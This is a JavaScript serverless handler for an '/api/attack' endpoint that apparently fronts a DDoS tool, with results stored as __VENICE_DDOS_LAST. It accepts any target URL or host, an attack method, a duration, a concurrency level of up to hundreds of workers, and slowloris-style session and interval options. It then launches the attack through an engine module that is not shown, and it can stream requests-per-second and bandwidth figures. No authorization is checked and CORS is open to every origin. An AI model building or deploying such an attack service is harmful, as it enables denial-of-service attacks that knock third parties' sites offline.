'use strict';

const { run } = require('../lib/engine');

let waitUntilFn = null;
try { waitUntilFn = require('@vercel/functions').waitUntil; } catch {}

const readQuery = (req) =>
  Object.fromEntries(new URL(req.url, `http://${req.headers.host || 'localhost'}`).searchParams.entries());

function readBody(req) {
  return new Promise((resolve) => {
    if (req.method === 'GET' || req.method === 'HEAD') return resolve({});
    let raw = '';
    req.on('data', (c) => { raw += c; if (raw.length > 1e6) req.destroy(); });
    req.on('end', () => { try { resolve(JSON.parse(raw || '{}')); } catch { resolve({}); } });
    req.on('error', () => resolve({}));
  });
}

const num = (v) => { const n = Number(v); return Number.isFinite(n) && n > 0 ? n : undefined; };
const bool = (v, dflt) =>
  v === undefined ? dflt : !['0', 'false', 'no', 'off'].includes(String(v).toLowerCase());

function buildOptions(q) {
  return {
    target: q.target || q.t || q.url || q.host,
    method: q.method || q.m || 'http-get',
    duration: num(q.duration || q.d || q.time) || 15,
    concurrency: num(q.concurrency || q.c || q.workers),
    port: num(q.port || q.p),
    payloadSize: num(q.payloadSize || q.size),
    payload: q.payload || q.data,
    sessions: num(q.sessions),
    slowInterval: num(q.slowInterval),
    socketTimeout: num(q.socketTimeout),
    userAgent: q.userAgent || q.ua,
    stream: bool(q.stream, false),
    async: bool(q.async, false),
  };
}

module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');

  if (req.method === 'OPTIONS') { res.status(204).end(); return; }

  const q = Object.assign(readQuery(req), await readBody(req));
  const opts = buildOptions(q);

  if (!opts.target) {
    res.status(400).json({
      ok: false,
      error: 'Missing "target".',
      example: '/api/attack?target=https://example.com&method=all&duration=30&concurrency=800',
    });
    return;
  }

  if (opts.async && waitUntilFn) {
    waitUntilFn(run(opts).then((r) => { globalThis.__VENICE_DDOS_LAST = r; }));
    res.status(202).json({ ok: true, mode: 'async', ...opts, hint: 'Poll /api/status for the last finished run.' });
    return;
  }

  if (opts.stream) {
    res.setHeader('Content-Type', 'application/x-ndjson');
    res.setHeader('Cache-Control', 'no-store');
    res.setHeader('X-Accel-Buffering', 'no');
    try {
      const result = await run(opts, (snap) => {
        res.write(JSON.stringify({
          tick: Number(snap.uptime.toFixed(1)),
          rps: Math.round(snap.rate.rps),
          mbps: Number((snap.rate.bps / 1e6).toFixed(2)),
          errors: snap.total.errors,
        }) + '\n');
      });
      res.write(JSON.stringify({ done: true, result }) + '\n');
    } catch (e) {
      res.write(JSON.stringify({ done: true, error: e.message }) + '\n');
    }
    res.end();
    return;
  }

  try {
    const result = await run(opts);
    globalThis.__VENICE_DDOS_LAST = result;
    res.status(200).json({ ok: true, ...result });
  } catch (e) {
    res.status(400).json({ ok: false, error: e.message });
  }
};
